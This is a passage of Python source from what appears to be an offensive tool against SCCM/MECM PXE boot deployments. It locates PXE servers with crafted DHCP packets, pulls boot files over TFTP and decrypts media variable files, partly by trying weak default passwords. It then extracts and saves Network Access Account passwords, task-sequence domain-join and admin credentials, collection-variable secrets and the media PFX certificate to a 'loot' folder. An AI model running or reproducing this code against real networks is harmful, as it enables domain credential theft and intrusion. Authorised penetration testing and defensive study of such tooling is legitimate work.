            dstr = zlib.decompress(binascii.unhexlify(root.text)).decode("utf-16-le")
            out = "".join(c for c in dstr if c.isprintable()) 
            colsettings_decrypted.append(out)
        colsettings = colsettings_decrypted

    return naaconfig, tsconfig, colsettings

## Parsing
## ------------------
def _parse_policy_xml(xml_string):
    # MECM policy bodies can carry trailing content past the first root (Hash
    # blocks, CBC padding, or extra siblings). lxml's recover mode parses up to
    # the first usable root and ignores the rest instead of raising
    # "Extra content at the end".
    parser = ET.XMLParser(recover=True)
    return ET.fromstring(xml_string, parser=parser)

class credential_processing_result:
    def __init__(self):
        self.naa_xml = None
        self.ts_xml = None
        self.collection_settings_xml = None

        self.naa_credentials = []
        self.ts_credentials = []
        self.collection_settings_credentials = []

    def _load_xml(self, xml, type):
        if type == "naa":
            self.naa_xml = xml
        elif type == "task_sequence":
            self.ts_xml = xml
        elif type == "collection_settings":
            self.collection_settings_xml = xml

    def process_xml(self, xml, type):
        self._load_xml(xml, type)

        if type == "naa":
            self._process_naa_xml()
        elif type == "task_sequence":
            self._decrypt_task_sequence_xml(xml)
        elif type == "collection_settings":
            self._process_collection_settings_xml()

    # Network Access Accounts
    def _process_naa_xml(self):
        if (VERBOSE):
            print_nice("Extracting Network Access Accounts", "INFO")
        root = _parse_policy_xml(self.naa_xml)
        network_access_account_xml = root.xpath("//*[@class='CCM_NetworkAccessAccount']")

        # Add a catch for if there are no NAAs
        for naa_settings in network_access_account_xml:
            network_access_username = deobfuscate_credential_string(naa_settings.xpath(".//*[@name='NetworkAccessUsername']")[0].find("value").text)
            network_access_username = network_access_username[:network_access_username.rfind('\x00')]
            network_access_password = deobfuscate_credential_string(naa_settings.xpath(".//*[@name='NetworkAccessPassword']")[0].find("value").text)
            network_access_password = network_access_password[:network_access_password.rfind('\x00')]

            naa_credential_pair = network_access_username, network_access_password
            #print(f'NAA Credential Pair')
            #print(f'\tNAA Username: {network_access_username} - {type(network_access_username)} - {"Empty" if network_access_username == "" else "Not Empty"}')
            #print(f'\tNAA Password: {network_access_password} - {type(network_access_password)} - {"Empty" if network_access_password == "" else "Not Empty"}')
            
            if ((network_access_username != "" or network_access_password != "")):
                self.naa_credentials.append(naa_credential_pair)
                if (VERBOSE):
                   print_nice("Network Access Account Credentials found!", "INFO")

        if (len(self.naa_credentials) == 0):
            if (VERBOSE):
                print_nice("No Network Access Account Credentials found!", "ERROR")

    # Task Sequences
    def _decrypt_task_sequence_xml(self, ts_xml):
        root = _parse_policy_xml(ts_xml)

        # Find all pkgnames
        ts_sequences = root.xpath("//*[@name='TS_Sequence']/value")

        for i in range(len(ts_sequences)):
            # Find all task sequences
            pkg_name = root.xpath("//*[@name='PKG_Name']/value")[i].text 
            adv_id = root.xpath("//*[@name='ADV_AdvertisementID']/value")[i].text
            ts_sequence_tag = root.xpath("//*[@name='TS_Sequence']/value")[i].text
            tsName = pkg_name + "-" + adv_id
            keepcharacters = (' ','.','_', '-')
            tsName = "".join(c for c in tsName if c.isalnum() or c in keepcharacters).rstrip()

            if ts_sequence_tag[:9] == "<sequence":
                tsSequence = ts_sequence_tag
            else:
                # Normal Task Sequence
                try:
                    # Attempt to decrypt the credential string
                    tsSequence = deobfuscate_credential_string(ts_sequence_tag)
                    print_nice(f"Successfully Decrypted TS_Sequence XML Blob in Task Sequence '{pkg_name}'!", "SUCCESS")
                except:
                    # If failed, though I have not seen this before
                    print_nice(f"Failed to decrypt TS_Sequence in '{pkg_name}'. ", "ERROR")
                    return

            tsSequence = tsSequence[:tsSequence.rfind(">")+1]
            tsSequence = "".join(c for c in tsSequence if c.isprintable() or c in keepcharacters).rstrip()

            print_nice("Writing decrypted 'TaskSequence_policy_" + tsName + ".xml'", "INFO")
            write_to_file(WORKING_DIR + "/policies", "TaskSequence_policy_" + tsName, tsSequence, "xml")

            if (VERBOSE):
                print_nice(f"Attempting to automatically identify credentials in Task Sequence: '{pkg_name}'", "INFO")
            self._analyse_task_sequence_for_potential_creds(tsName, tsSequence)

    def _analyse_task_sequence_for_potential_creds(self, ts_name, ts_xml):
        """Known tags: 
            property="DomainPassword" name="OSDJoinPassword", 
            property="DomainUsername" name="OSDJoinAccount", 
            property="AdminPassword" name="OSDLocalAdminPassword", 
            property="RegisteredUserName" name="OSDRegisteredUserName", 
            property="CapturePassword" name="OSDCaptureAccountPassword", 
            property="CaptureUsername" name="OSDCaptureAccount"
        """
        tree = _parse_policy_xml(ts_xml).getroottree()

        # Keywords to search through for potential credentials
        keyword_list = ["password", "account", "username"]
        element_search_list = []
        
        for word in keyword_list:
            # TODO  search through different attributes other than name? 
            element_search_list.append([word, tree.xpath('//*[contains(translate(@name,"ABCDEFGHIJKLMNOPQRSTUVWXYZ","abcdefghijklmnopqrstuvwxyz"),"' + word +'")]')]) 
        
        parent_list = []
        creds_found = False

        for word, elements in element_search_list:
            for element in elements:
                if not creds_found:
                    # Print if a potential credential is in the list
                    if (VERBOSE):
                        print_nice("Possible credential fields found!", "SUCCESS")
                        creds_found = True

                # TODO if parent is defaultvarlist
                parent = element.getparent() 
                if parent not in parent_list:
                    parent_list.append(parent)
                    # Print the Task Sequence step it is using
                    task_sequence_step = parent.getparent().attrib["name"]
                    # Debug
                    if (VERBOSE):
                        print("In TS Step \"" + task_sequence_step + "\":")

                    unique_words = [x for x in keyword_list if x != word]

                    par = ET.ElementTree(parent)
                    for unique_word in unique_words:
                        for el in par.xpath('//*[contains(translate(@name,"ABCDEFGHIJKLMNOPQRSTUVWXYZ","abcdefghijklmnopqrstuvwxyz"),"' + unique_word + '")]'):
                            # Duplicate tags that match more than one keyword
                            if el != element:
                                self.ts_credentials.append((ts_name, task_sequence_step, el.attrib["name"], el.text))
                                # Debug
                                if (VERBOSE):
                                    print(f"\t{el.attrib['name']} - {el.text}")
                    # Debug
                    if (VERBOSE):
                        print(f"\t{element.attrib['name']} - {element.text}")
                    self.ts_credentials.append((ts_name, task_sequence_step, element.attrib["name"], element.text))

        if not creds_found:
            # Print no credentials found in task sequence
            if VERBOSE:
                print_nice("No credentials identified in this Task Sequence.", "ERROR")

    # Collection Settings
    def _process_collection_settings_xml(self):
        if (VERBOSE):
            print_nice("Extracting Collection Settings Secrets", "INFO")
            
        root = _parse_policy_xml(self.collection_settings_xml)
        instances = root.find("PolicyRule").find("PolicyAction").findall("instance")

        for instance in instances:
            collection_var_name = instance.xpath(".//*[@name='Name']/value")[0].text 
            encrypted_collection_var_secret = instance.xpath(".//*[@name='Value']/value")[0].text

            collection_var_secret = deobfuscate_credential_string(encrypted_collection_var_secret)
            collection_var_secret = collection_var_secret[:collection_var_secret.rfind('\x00')]
            if collection_var_secret != "" and collection_var_name != "":
                self.collection_settings_credentials.append((collection_var_name, collection_var_secret))
                #print_nice(f"Collection Variable Name: '{collection_var_name}'", "INFO")
                #print_nice(f"Collection Variable Secret: '{collection_var_secret}'", "INFO")

    # Output 
    def _print_naa_credentials_table(self):
        table = Table(title="NAA Credentials")
        table.add_column("Username", justify="center", no_wrap=True)
        table.add_column("Password", justify="center", no_wrap=True)
        for credential in self.naa_credentials:
            table.add_row(credential[0], credential[1])
        console = Console()
        console.print(table)

    def _displayable_ts_credentials(self):
        # Exclude entries whose value is None or empty. These come from
        # credential variables with no text (e.g. <variable name="OSDJoinPassword"/>)
        # and represent no credential, so neither the value nor its TS step
        # should appear in the "Potential Credentials" output.
        # Tuples are (task_sequence, ts_step, key, value).
        return [
            cred for cred in self.ts_credentials
            if cred[3] is not None and cred[3] != ""
        ]

    def _print_ts_credentials_table(self):
        creds = self._displayable_ts_credentials()
        if not creds:
            return
        # Combined table of all potential TS credentials, led by the Task
        # Sequence the credential was found in.
        table = Table(title="Potential Task Sequence Credentials")
        table.add_column("Task Sequence", justify="center", no_wrap=True)
        table.add_column("TS Step", justify="center", no_wrap=True)
        table.add_column("Key", justify="center", no_wrap=True)
        table.add_column("Value", justify="center", no_wrap=True)
        for cred in creds:
            ts_name, ts_step, value_name, value_value = cred
            table.add_row(str(ts_name), str(ts_step), str(value_name), str(value_value))
        console = Console()
        console.print(table)

    def _deduplicated_credentials(self):
        # Categorise credential values by their key: keys matching
        # "username"/"account"/"user" are usernames, keys matching "password"
        # are passwords. Values are deduplicated (order preserved). Only
        # displayable (non-None/non-empty) values are considered.
        usernames = []
        passwords = []
        for cred in self._displayable_ts_credentials():
            key = (cred[2] or "").lower()
            value = cred[3]
            if value is None or value == "":
                continue
            if "password" in key:
                if value not in passwords:
                    passwords.append(value)
            elif "username" in key or "account" in key or "user" in key:
                if value not in usernames:
                    usernames.append(value)
        return usernames, passwords

    def _print_deduplicated_credentials_table(self):
        usernames, passwords = self._deduplicated_credentials()
        if not usernames and not passwords:
            return
        table = Table(title="Deduplicated Credentials (not combos)")
        table.add_column("Username", justify="center", no_wrap=True)
        table.add_column("Password", justify="center", no_wrap=True)
        # The two lists are independent deduplicated sets; pair them positionally
        # for display only (not an implied username/password mapping).
        max_rows = max(len(usernames), len(passwords))
        for i in range(max_rows):
            u = usernames[i] if i < len(usernames) else ""
            p = passwords[i] if i < len(passwords) else ""
            table.add_row(str(u), str(p))
        console = Console()
        console.print(table)

    def _print_collection_settings_credentials_table(self):
        table = Table(title="Collection Settings Credentials")
        table.add_column("Variable Name", justify="center", no_wrap=True)
        table.add_column("Variable Secret", justify="center", no_wrap=True)
        for credential in self.collection_settings_credentials:
            table.add_row(credential[0], credential[1])
        console = Console()
        console.print(table)

    def print_all_credentials(self):
        if len(self.naa_credentials) > 0:
            self._print_naa_credentials_table()
        if len(self._displayable_ts_credentials()) > 0:
            self._print_ts_credentials_table()
        usernames, passwords = self._deduplicated_credentials()
        if usernames or passwords:
            self._print_deduplicated_credentials_table()
        if len(self.collection_settings_credentials) > 0:
            self._print_collection_settings_credentials_table()

    def output_all_credentials_to_file(self, path):
        if len(self.naa_credentials) > 0:
            write_to_file(path, "NAA_Credentials", json.dumps(self.naa_credentials), "json")
        if len(self.ts_credentials) > 0:
            write_to_file(path, "TS_Potential_Credentials", json.dumps(self.ts_credentials), "json")
        if len(self.collection_settings_credentials) > 0:
            write_to_file(path, "Collection_Settings_Credentials", json.dumps(self.collection_settings_credentials), "json")

def extract_key_information_from_variables(input):
    global BRANDING_TITLE
    global SITECODE
    global STANDALONE_MEDIA
    global SMS_MEDIA_GUID
    global WORKING_DIR
    global SCCM_BASE_URL
    global SMS_MEDIA_PFX

    root = ET.fromstring(input.encode("utf-16-le"))
    try:
        BRANDING_TITLE = root.find('.//var[@name="_SMSTSBrandingTitle"]').text
    except:
        pass
    try:
        SITECODE = root.find('.//var[@name="_SMSTSSiteCode"]').text
    except:
        pass
    try:
        STANDALONE_MEDIA = root.find('.//var[@name="_SMSTSStandAloneMedia"]').text
    except:
        pass
    try:
        SMSTSMP = root.find('.//var[@name="SMSTSMP"]')
    except:
        pass
    try:
        SMSTSLocationMPs = root.find('.//var[@name="SMSTSLocationMPs"]')
    except:
        pass
    try:
        SMS_MEDIA_SITE_CODE = root.find('.//var[@name="_SMSTSSiteCode"]').text
    except:
        pass
    try:
        SMS_MEDIA_PFX = root.find('.//var[@name="_SMSTSMediaPFX"]').text
    except:
        pass
    try:
        SMS_MEDIA_GUID = root.find('.//var[@name="_SMSMediaGuid"]').text
    except:
        pass

    WORKING_DIR = "loot/" + SITECODE + "_" + BRANDING_TITLE + "_" + SMS_MEDIA_GUID + "_" + datetime.now().strftime("%Y%m%d_%H%M%S")
    if not os.path.exists(WORKING_DIR):
        os.makedirs(WORKING_DIR)
    if not os.path.exists(WORKING_DIR + "/policies"):
        os.makedirs(WORKING_DIR + "/policies")

    if (SMS_MEDIA_GUID != "") and (SMS_MEDIA_PFX != ""):
        # Certificate used to securely communicate to the SCCM/MCM server
        filename = SMS_MEDIA_SITE_CODE + "_" + SMS_MEDIA_GUID +"_SMSTSMediaPFX.pfx"
        
        print_nice(f"Writing _SMSTSMediaPFX to {filename}", "INFO")
        print_nice(f"Certificate password is {SMS_MEDIA_GUID}", "INFO")

        # Target Folder instead?
        write_to_file(WORKING_DIR, filename, binascii.unhexlify(SMS_MEDIA_PFX), "binary")
        write_to_file(WORKING_DIR, f"{filename}_password", SMS_MEDIA_GUID, "txt")

    if SCCM_BASE_URL == "":
        if (VERBOSE):
            print_nice("Identifying Management Point URL from media variables", "INFO")

        if SMSTSMP is not None:
            # Modifying to fix a bug where if multiple SCCM enviroment variables are found, they default to the first one.
            SCCM_BASE_URL = SMSTSMP.text.split('*')[0]
        
        #Partial Media - SMSTSLocationMPs
        elif SMSTSLocationMPs is not None:    
            SCCM_BASE_URL = SMSTSLocationMPs.text
        else: 
            if (STANDALONE_MEDIA == "true"):
                if (VERBOSE):
                    print_nice("Standalone Media detected - No Management Point URL required", "INFO")
            else:
                if (VERBOSE):
                    print_nice("No Management Point URL found in media variables", "ERROR")
    
        if SCCM_BASE_URL != "":
            if (VERBOSE):
                print_nice("Management Point set to: " + SCCM_BASE_URL, "INFO")

    return [SMS_MEDIA_GUID, SMS_MEDIA_PFX]

def parse_media_files(password:str = None, variables_file:str = None, policy_file:str = None, bcd_file:str = None):
    #print(password)
    #print(variables_file)
    #print(policy_file)

    # Move files to a temporary working directory from now on
    temp_location = os.path.join(WORKING_DIR, ".temp_media_location")
    if (variables_file is not None):
        variables_file = copy_file_to_dir(variables_file, temp_location)
    if (policy_file is not None):
        policy_file = copy_file_to_dir(policy_file, temp_location)
    if (bcd_file is not None):
        bcd_file = copy_file_to_dir(bcd_file, temp_location)

    if (variables_file is not None):
        # Decrypt Media Variables File
        if (password == None):
            response, media_variables, resolved_password = test_default_weak_passwords_on_media(variables_file)
            if response:
                #print_nice("Successfully decrypted media variables file using default/weak password!", "SUCCESS")
                pass
        else:
            # Doing this as a way to check for if we use a hex based password (IE your encrypted_key) or a string password (standard set password)
            if (type(password) == str):
                media_variables = decrypt_media_file(variables_file, password)
            else:
                media_variables = decrypt_pxe_media_from_encrypted_key(password, variables_file)

        if (media_variables == None):
            return [None, None]
        else:
            print_nice("Successfully decrypted media variables file!", "SUCCESS")
            # Extract Key Information from Media Variables
            smsMediaGuid, smsTSMediaPFX = extract_key_information_from_variables(media_variables)

            # Move decrypted media variables to the proper working directory
            variables_file = copy_file_to_dir(variables_file, f"{WORKING_DIR}/original_files/", delete_original=True)
            # Preserve the BCD boot configuration hive alongside the originals
            if (bcd_file is not None):
                copy_file_to_dir(bcd_file, f"{WORKING_DIR}/original_files/", delete_original=True)
            write_to_file(WORKING_DIR, "variables_decrypted", media_variables)

            # Code Escape if Standalone Media Type is identified
            if (STANDALONE_MEDIA == "true" and policy_file is None):
                print_nice("Stand-alone media detected. Please supply Policy file.")
                return [None, None]
            
            # Decrypt Policy File
            if (policy_file is not None):
                policy_path = copy_file_to_dir(policy_file, f"{WORKING_DIR}/original_files/", delete_original=True)

                if (password == None):
                    password = smsMediaGuid
                
                decrypted_policy = decrypt_policy_file(policy_path, password)
                if decrypted_policy != None:
                    write_to_file(WORKING_DIR, "policies_decrypted", decrypted_policy)
                    return [[media_variables], [decrypted_policy]]
                else:
                    print_nice("Failed to decrypt Policy file.", "ERROR")
                    return [None, None]
                
            # If no Policy file is supplied but we were able to decrypt the media variables
            else:
                # If the PFX is there, then we can try and download the policies from the server
                if (smsMediaGuid != "") and (smsTSMediaPFX != ""):
                    return [[media_variables], None]

def parse_files_for_credentials(media_variables:str = None, policies:str = None, collection_settings:str = None):
    credprocessing = credential_processing_result()

    if media_variables is not None:
        if (VERBOSE):
            print_nice("Processing Media Variables Configuration", "INFO")
        for media_variable in media_variables:
            credprocessing.process_xml(media_variable, "naa")
    if policies is not None:
        if (VERBOSE):
            print_nice("Processing Task Sequence Configuration", "INFO")
        for policy in policies:
            credprocessing.process_xml(policy, "task_sequence")
    if collection_settings is not None:
        if (VERBOSE):
            print_nice("Processing Collection Settings Configuration", "INFO")
        for collection_setting in collection_settings:
            credprocessing.process_xml(collection_setting, "collection_settings")

    credprocessing.print_all_credentials()
    credprocessing.output_all_credentials_to_file(os.path.abspath(os.path.join(WORKING_DIR, "extracted_credentials"))) 

def start_sniffing(sniff_filter, timeout=60, count=1000, packet_list=None, stop_filter=None, iface=None):
    # stop_filter lets sniff() return immediately when the expected packet is
    # captured instead of blocking for the full timeout. This is what makes the
    # TFTP downloader fast (per-block latency ~= RTT rather than ~= timeout).
    # iface pins the sniff to a specific interface (needed on Windows where the
    # default conf.iface may differ from the one selected for the operation).
    kwargs = dict(filter=sniff_filter, timeout=timeout, count=count, stop_filter=stop_filter)
    if iface is not None:
        kwargs["iface"] = iface
    captured = sniff(**kwargs)
    if packet_list is not None:
        packet_list.extend(captured)
    return captured

def download_file_tftp_scapy(server_ip, remote_filename, local_path, server_port=69, timeout=5, max_retries=5, blksize=1468):
    # Download a file over TFTP using scapy's libpcap send/receive path.
    #
    # tftpy uses a plain UDP socket, so on Windows the firewall drops the server's
    # DATA packets (which arrive from a server-chosen ephemeral port that the
    # stateful firewall doesn't recognise as return traffic). scapy sends/sniffs
    # via the Npcap driver which bypasses the Windows Firewall, so the transfer
    # succeeds. A dummy UDP socket is bound on our chosen TID so the kernel does
    # not emit an ICMP port-unreachable in response to the first DATA packet
    # (which some servers interpret as the client cancelling the transfer).
    #
    # Performance: the RRQ carries a blksize option (RFC 2348) so the server
    # sends larger DATA blocks (fewer round-trips), and each sniff uses a
    # stop_filter so it returns the moment the expected DATA/OACK arrives instead
    # of blocking for the full per-block timeout. Together this makes a transfer
    # take ~RTT*blocks rather than ~timeout*blocks.
    #
    # blksize default is 1468 (Ethernet MTU-safe: 1500 - 20 IP - 8 UDP - 4 TFTP
    # header). Requesting a larger value is risky: if the server honours it but
    # its DATA datagrams are still MTU-limited on the wire (no IP fragmentation,
    # as with SCCM/WDS), each block arrives smaller than the negotiated blksize
    # and the standard "short block = EOF" test fires prematurely, truncating the
    # file. 1468 matches what SCCM/WDS TFTP uses natively, so negotiated == wire.
    if (VERBOSE):
        print_nice(f"TFTP (scapy) GET tftp://{server_ip}:{server_port}/{remote_filename} -> {local_path} (blksize={blksize})", "INFO")

    # Choose a client TID (source port). Avoid 68 as that is DHCP.
    preferred_tid = 60069

    # Bind a socket so the host does not reply to the first DATA with ICMP
    # port-unreachable (this can abort the transfer on some stacks).
    #
    # On Windows, binding to a hardcoded port can fail with WinError 10013
    # (WSAEACCES) when the port falls inside an excluded UDP port range
    # reserved by Hyper-V / WinNAT (see
    # `netsh int ipv4 show excludedportrange protocol=udp`). To stay reliable,
    # try the preferred port first, then fall back to an OS-assigned ephemeral
    # port (bind to port 0), which Windows guarantees is usable. Binding to the
    # specific interface IP may also fail if that address is not currently
    # assigned, so 0.0.0.0 is tried as a final fallback. The socket's actual
    # bound port is always used as the client TID so the packet source ports
    # and sniff filters below match what the OS socket holds.
    dummy_sock = None
    bind_errors = []
    for bind_ip, bind_port in (
        (clientIPAddress, preferred_tid),
        (clientIPAddress, 0),
        ("0.0.0.0", 0),
    ):
        candidate_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            candidate_sock.bind((bind_ip, bind_port))
        except (PermissionError, OSError) as bind_err:
            bind_errors.append(f"{bind_ip}:{bind_port} -> {bind_err}")
            candidate_sock.close()
            continue
        dummy_sock = candidate_sock
        break

    if dummy_sock is None:
        print_nice(f"Unable to bind a local TFTP socket (tried {'; '.join(bind_errors)})", "ERROR")
        return False

    client_tid = dummy_sock.getsockname()[1]
    if (VERBOSE):
        print_nice(f"Client TID (source port): {client_tid}", "INFO")
    dummy_sock.setblocking(False)

    try:
        # RFC 1350 RRQ: opcode(2) filename(1) mode(1), plus a blksize option
        # (RFC 2348) for faster transfers. If the server supports option
        # negotiation it replies with an OACK; if not, it ignores the option and
        # sends DATA block 1 at the default 512-byte block size.
        rrq = (b"\x00\x01" + remote_filename.encode("utf-8", "ignore") + b"\x00octet\x00"
               + b"blksize\x00" + str(blksize).encode() + b"\x00")
        pkt = IP(src=clientIPAddress, dst=server_ip) / UDP(sport=client_tid, dport=server_port) / Raw(load=rrq)

        server_tid = None
        expected_block = 1
        received = bytearray()
        last_pkt = pkt
        retries = 0
        transfer_done = False
        # Effective block size for the final-block (EOF) test. Starts at the
        # default 512 and is updated from the OACK blksize. With the MTU-safe
        # default blksize (1468) the negotiated value matches the actual on-wire
        # DATA payload size, so the standard "short block = EOF" test is correct.
        effective_blksize = 512

        while not transfer_done:
            # Capture UDP traffic from the server (either from port 69 for the
            # first DATA/OACK, or from the negotiated server TID thereafter).
            if server_tid is None:
                bpf = f"udp and src host {server_ip} and dst port {client_tid}"
            else:
                bpf = f"udp and src host {server_ip} and src port {server_tid} and dst port {client_tid}"

            # stop_filter: return as soon as we see the expected DATA block, or
            # an OACK (only while waiting for block 1). Default-arg captures the
            # current expected_block value for this iteration.
            def _stop_filter(p, _eb=expected_block):
                if UDP in p and Raw in p:
                    raw = bytes(p[Raw].load)
                    if len(raw) >= 2:
                        op = raw[:2]
                        if op == b"\x00\x06" and _eb == 1:  # OACK
                            return True
                        if op == b"\x00\x03" and len(raw) >= 4:  # DATA
                            if int.from_bytes(raw[2:4], "big") == _eb:
                                return True
                return False

            captured = []
            sniff_thread = Thread(target=start_sniffing, args=(bpf, timeout, 100, captured, _stop_filter))
            sniff_thread.start()
            # (Re)send the last packet (initial RRQ, ACK block 0, or a retransmit
            # of the last ACK). Sending after the sniff is armed means we don't
            # miss a fast reply.
            send(last_pkt, verbose=0)
            sniff_thread.join()

            # Look for an OACK (option negotiation) first, then the expected DATA.
            oack_pkt = None
            data_pkt = None
            for p in captured:
                if not (UDP in p and Raw in p):
                    continue
                raw = bytes(p[Raw].load)
                if len(raw) < 2:
                    continue
                if raw[:2] == b"\x00\x06" and expected_block == 1:
                    oack_pkt = p
                    break
                if raw[:2] == b"\x00\x03" and len(raw) >= 4:
                    if int.from_bytes(raw[2:4], "big") == expected_block:
                        data_pkt = p
                        break

            # Handle OACK: parse negotiated blksize, then ACK block 0 to start data.
            if oack_pkt is not None and data_pkt is None:
                if server_tid is None:
                    server_tid = oack_pkt[UDP].sport
                # OACK payload after the opcode is name\x00value\x00 pairs.
                parts = bytes(oack_pkt[Raw].load)[2:].split(b"\x00")
                i = 0
                while i + 1 < len(parts):
                    name = parts[i].decode("latin-1", "ignore").lower()
                    val = parts[i + 1].decode("latin-1", "ignore")
                    if name == "blksize":
                        try:
                            effective_blksize = max(8, min(int(val), blksize))
                        except ValueError:
                            pass
                    i += 2
                # ACK block 0 to acknowledge the option negotiation and start data.
                last_pkt = IP(src=clientIPAddress, dst=server_ip) / UDP(sport=client_tid, dport=server_tid) / Raw(load=b"\x00\x04\x00\x00")
                retries = 0
                continue

            if data_pkt is None:
                retries += 1
                if retries > max_retries:
                    print_nice(f"TFTP transfer of '{remote_filename}' timed out waiting for block {expected_block}", "ERROR")
                    return False
                continue

            # Lock in the server's TID once we see the first DATA.
            if server_tid is None:
                server_tid = data_pkt[UDP].sport

            raw = bytes(data_pkt[Raw].load)
            block = int.from_bytes(raw[2:4], "big")
            payload = raw[4:]
            received.extend(payload)
            retries = 0
            expected_block += 1

            # ACK this block; it is (re)sent at the top of the next iteration.
            ack = b"\x00\x04" + block.to_bytes(2, "big")
            last_pkt = IP(src=clientIPAddress, dst=server_ip) / UDP(sport=client_tid, dport=server_tid) / Raw(load=ack)

            # A DATA packet smaller than the effective block size signals the final block
            if len(payload) < effective_blksize:
                # Final block: send the last ACK now since we won't loop again.
                send(last_pkt, verbose=0)
                transfer_done = True

        # Ensure the destination directory exists
        dest_dir = os.path.dirname(local_path)
        if dest_dir and not os.path.exists(dest_dir):
            os.makedirs(dest_dir)
        with open(local_path, "wb") as f:
            f.write(bytes(received))

        if (VERBOSE):
            print_nice(f"TFTP download complete: {local_path} ({len(received)} bytes)", "SUCCESS")
        return True
    except Exception as e:
        print_nice(f"TFTP download of '{remote_filename}' failed: {e}", "ERROR")
        return False
    finally:
        dummy_sock.close()

## PXE Networking retrieval
## ------------------
def find_pxe_server():
    # Find PXE server with DHCP discover packet with the right options set 
    print_nice("Sending initial DHCP Discover to find PXE boot server...")

    # DHCP Discover packet is from IP 0.0.0.0, with destination 255.255.255.255 and ff:ff:ff:ff:ff:ff destination MAC address. 
    # Need to ask for DHCP options 66 and 67 to find PXE servers.
    #
    # The PXEClient vendor class ID (option 60) and client architecture
    # (option 93) are REQUIRED for SCCM/WDS PXE responders to recognise this
    # as a PXE boot request and respond with PXE boot options. Without them the
    # PXE server treats it as a regular DHCP discover and does not include the
    # TFTP server / boot file / BCD options we need. This matches what the
    # port 4011 request and wtftp.py both send.
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=clientMacAddress)/IP(src="0.0.0.0", dst="255.255.255.255")/UDP(sport=68, dport=67)/BOOTP(chaddr=clientMacAddress)/DHCP(options=[
            ("message-type", "discover"),
            # Option 60: PXEClient vendor class identifier
            ('vendor_class_id', b'PXEClient:Arch:00009:UNDI:003001'),
            # Option 93: Client System Architecture (x64 UEFI = 0x0009)
            (93, b'\x00\x09'),
            # Option 94: Client Network Interface Identifier (UNDI 3.001)
            (94, b'\x00\x03\x00\x01'),
            ('param_req_list',[
                1,   # Subnet Mask
                3,   # Router
                6,   # DNS
                43,  # Vendor Specific Info (PXE options)
                60,  # Vendor Class Identifier
                66,  # TFTP Server Name
                67   # Bootfile Name
            ]
        ),
        "end"]
    )

    # Make scapy ignore IP address when checking for responses (needed because we sent to a broadcast address)
    conf.checkIPaddr = False 

    # This could fail if multiple DHCP servers exist in the environment and only some of them offer the PXE server in their response
    # This is out loop to check if we have a valid PXE server response
    #ans = srp1(pkt, timeout = 5,
    ## Uncomment to enable verbose scapy output with the ... style
    # verbose = 0
    #)

    # Pin both the sniff and the send to conf.iface. On Windows with Npcap,
    # sendp()/sniff() without an explicit iface may use the system default
    # interface (e.g. Wi-Fi) instead of the one configure_scapy_networking()
    # selected, causing the DHCP discover to go out on the wrong interface and
    # the sniff to miss the responses.
    packets = []
    sniff_thread = Thread(target=start_sniffing, args=("udp and (port 67 or port 68)", 10, 1000, packets), kwargs={"iface": conf.iface})
    sniff_thread.start()
    time.sleep(1)
    sendp(pkt, iface=conf.iface)
    sniff_thread.join()

    pxe_offers = []
    dhcp_offer = None

    for packet in packets:
        if DHCP in packet and BOOTP in packet:
            dhcp_options = {opt[0]: opt[1] for opt in packet[DHCP].options if isinstance(opt, tuple)}
            if dhcp_options.get("message-type") == 2:
                if dhcp_options.get(60) or dhcp_options.get("vendor_class_id"):
                    vendor_class = dhcp_options.get(60) or dhcp_options.get("vendor_class_id")
                    if b"PXEClient" in vendor_class or "PXEClient" in str(vendor_class):
                        pxe_offers.append(packet)
                        if (VERBOSE):
                            print_nice(f"Found PXE offer from {packet[IP].src}", "INFO")
                
                if packet[BOOTP].yiaddr != "0.0.0.0":
                    dhcp_offer = packet
                    if (VERBOSE):
                        print_nice(f"Found DHCP offer from {packet[IP].src}", "INFO")
                        
    ans = pxe_offers[0] if pxe_offers else dhcp_offer

    conf.checkIPaddr = True

    if ans:
        packet = ans

        # Pull out DHCP offer from received answer packet
        dhcp_options = packet[1][DHCP].options

        # The TFTP/PXE server can be signalled in several places:
        #   - DHCP option 66 ("tftp_server_name" / sname option)
        #   - BOOTP siaddr field ("next server" IP) — common with WDS/SCCM PXE
        #     proxy responders which don't always populate option 66
        # Prefer option 66, fall back to siaddr.
        tftp_server = next(
            (opt[1] for opt in dhcp_options if isinstance(opt, tuple) and opt[0] == "tftp_server_name"),
            None
        )

        if not tftp_server:
            # Fall back to the BOOTP next-server (siaddr) field used by WDS/SCCM
            siaddr = packet[BOOTP].siaddr
            if siaddr and siaddr != "0.0.0.0":
                tftp_server = siaddr.encode("utf-8") if isinstance(siaddr, str) else siaddr

        if tftp_server:
            if isinstance(tftp_server, bytes):
                tftp_server = tftp_server.rstrip(b"\0").decode("utf-8")

            boot_file = next(
                (opt[1] for opt in dhcp_options if isinstance(opt, tuple) and opt[0] == "boot-file-name"),
                None
            )

            if boot_file:
                # Come back to and review the rstrip and update this potentially?
                # DHCP option 67 is Bootfile Name
                boot_file = boot_file.rstrip(b"\0").decode("utf-8")
            else:
                # Fall back to the BOOTP file field if option 67 is absent
                boot_file = packet[BOOTP].file.decode("utf-8", "ignore").rstrip("\x00") if packet[BOOTP].file else ""
    else:
        print_nice("No DHCP responses received with PXE boot options", "ERROR") 
        return None
    
    print_nice(f"Received DHCP offer from PXE server: {packet[1][IP].src}")

    # Catch for nonetype dhcp response
    if tftp_server is None:
        print_nice("No TFTP server name found in the DHCP offer packet", "ERROR")
        return None

    # Need to dig into this more because surely this can be done easier?
    tftp_server = validate_ip_or_resolve_hostname(tftp_server.strip())

    if (tftp_server != None):
        print_nice("PXE Server IP: " + tftp_server, "INFO")
    if (boot_file != None):
        print_nice("Boot File Location: " + boot_file, "INFO")

    return tftp_server

def get_variable_file_path(tftp_server):
    global BLANK_PASSWORDS_FOUND
    # Ask SCCM for location to download variable file. This is done with a DHCP Request packet
    print_nice("Asking ConfigMgr for location to download the media variables and BCD files...")

    # Media Variable file is generated by sending DHCP request packet to port 4011 on a PXE enabled DP. 
    # This contains DHCP options 60, 93, 97 and 250

    # Craft the Packet for requesting the variable file location
    # multicast/link-local in use for the Destination to allow for multicast to use a specific interface: https://scapy.readthedocs.io/en/latest/usage.html#multicast
    pkt = IP(src=clientIPAddress, dst=ScopedIP(tftp_server, scope=conf.iface))/UDP(sport=68, dport=4011)/BOOTP(ciaddr=clientIPAddress, chaddr=clientMacAddress)/DHCP(options=[
        ("message-type", "request"),
        # 3c 80 81 82 83 84 85 86 87
        ('param_req_list', [60, 128, 129, 130, 131, 132, 133, 134, 135]), 

        # x86 architecture
        ('pxe_client_architecture', b'\x00\x00'), 

